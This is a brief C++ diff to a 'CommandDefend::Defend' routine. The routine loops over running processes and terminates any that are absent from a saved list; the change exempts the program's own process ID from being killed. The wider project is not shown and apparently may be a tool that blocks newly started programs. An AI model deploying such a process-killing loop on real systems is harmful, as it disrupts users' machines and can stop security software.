@@ -97,6 +97,7 @@ void CommandDefend::Defend()
 
 	register size_t i = 0;
 	HANDLE hProcess;
+	DWORD CID = GetCurrentProcessId();
 	while (true)
 	{
 		EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded);
@@ -105,7 +106,7 @@ void CommandDefend::Defend()
 
 		for (i = 0; i < numberOfProcesses; i++)
 		{
-			if (!this->DoesProcessExistInList(aProcesses[i], numberOfProcesses))
+			if (!this->DoesProcessExistInList(aProcesses[i], numberOfProcesses)&& aProcesses[i] != CID)
 			{
 				//Get process handle.
 				hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, aProcesses[i]);
